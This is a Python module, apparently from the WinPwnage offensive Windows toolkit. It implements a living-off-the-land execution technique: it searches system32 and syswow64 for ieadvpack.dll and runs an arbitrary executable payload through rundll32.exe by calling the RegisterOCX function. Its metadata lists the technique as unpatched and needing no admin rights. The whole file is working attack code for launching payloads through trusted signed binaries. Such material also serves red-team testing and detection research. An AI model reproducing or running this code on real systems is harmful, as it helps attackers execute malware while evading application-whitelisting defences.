import os
import random
from winpwnage.core.prints import *
from winpwnage.core.utils import *

#https://lolbas-project.github.io/lolbas/Libraries/Ieadvpack/

ieadvpack_info = {
	"Description": "Launch an executable by calling the RegisterOCX function in ieadvpack.dll",
	"Id": "8",
	"Type": "Execution",
	"Fixed In": "99999",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "exec_ieadvpack",
	"Function Payload": True,
}


def exec_ieadvpack(payload):
	if payloads().exe(payload):
		paths = []
		dll = "ieadvpack.dll"
		binary = "rundll32.exe"

		print_info("Searching for ({dll}) in system32 and syswow64".format(dll=dll))
		for root, dirs, files in os.walk(information().windows_directory()):	
			for name in files:
				if name.lower() == dll:
					if "system32" in root.lower() or "syswow64" in root.lower():
						paths.append(os.path.join(root, name))

		try:
			path = random.choice(paths)
		except IndexError:
			print_error("Unable to proceed, ({dll}) not found on system".format(dll=dll))
			return False
		else:
			print_info("Attempting to launch {payload} using ({binary}) binary".format(payload=payload,binary=binary))
			exit_code = process().create(binary,
						params="{dll},RegisterOCX {payload}".format(dll=dll,payload=payload),
						get_exit_code=True)

			if exit_code == 0:
				print_success("Successfully created process ({}) exit code ({})".format(payload, exit_code))
			else:
				print_error("Unable to create process ({}) exit code ({})".format(payload, exit_code))
				return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False				